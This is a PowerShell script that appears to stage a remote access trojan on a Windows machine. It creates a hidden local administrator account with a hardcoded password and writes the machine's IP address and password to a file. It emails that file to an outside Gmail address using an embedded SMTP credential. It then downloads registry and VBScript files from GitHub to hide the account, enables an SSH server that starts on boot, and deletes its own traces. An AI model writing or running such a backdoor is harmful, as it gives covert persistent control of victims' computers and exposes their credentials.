# builds resources for RAT
# created by petros

#random string for directory
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

#create Local Admin for RAT
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary Local Admin"
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$uname added to the local administrator group"
    }
    end {
    }
}

# create Admin User
$uname = "petrosrat"
$password = "PetrosRAT123"   # he uses random password with the function above  $password = random_text
$pword = (ConvertTo-SecureString $password -AsPlainText -Force)
create_account -uname $uname -pword $pword

# variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
$configfile = "$env:UserName.rat"


$ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress

# writes config file
Add-Content -Path $configfile -Value $ip
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $path

#smtp process
Send-MailMessage -From "websitepetros@gmail.com" -To "websitepetros@gmail.com" -subject "$env:UserName" -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "websitepetros@gmail.com", (ConvertTo-SecureString -String 'tqck alhn siqo dtqz' -AsPlainText -Force))



# go to temp, make working directory
mkdir $path
Set-Location $path


# registry to hide local admin
Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/hide-user.reg -OutFile "hide-user.reg"

# visual basic script to register
Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/confirm-reg.vbs -OutFile "confirm-reg.vbs"

# enabling persistent ssh
Add-WindowsCapability -Online -Name OpeSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -name sshd -StartupType 'Automatic'

 

# install the registry
./hide-user.reg; ./confirm-reg.vbs


# hide rat user
Set-Location C:/Users
attrib +h +s +r petrosrat


# self delete
Set-Location $initial_dir
Remove-Item $configfile
Remove-Item email.txt
Remove-Item pass.txt
# Remove-Item stage2.ps1